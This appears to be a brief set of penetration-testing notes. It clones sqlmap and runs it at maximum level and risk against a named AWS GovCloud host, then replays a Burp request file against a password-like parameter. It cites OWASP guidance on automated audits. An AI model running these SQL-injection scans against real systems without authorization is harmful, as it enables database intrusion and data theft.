

cd ~/Desktop/
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev/
python ./sqlmap.py --user-agent "test" --url "https://boutte-reanplatform-dockerhost-1002413089.us-gov-west-1.elb.amazonaws.com" --threads=4 --dbms MySQL --level=5 --risk=3 --banner --answers="union-char=Y" --keep-alive --eta -v 3


https://www.owasp.org/index.php/Automated_Audit_using_SQLMap



# attach post request with configuration coming from burp file
./sqlmap.py -r search-test.txt -p tfUPass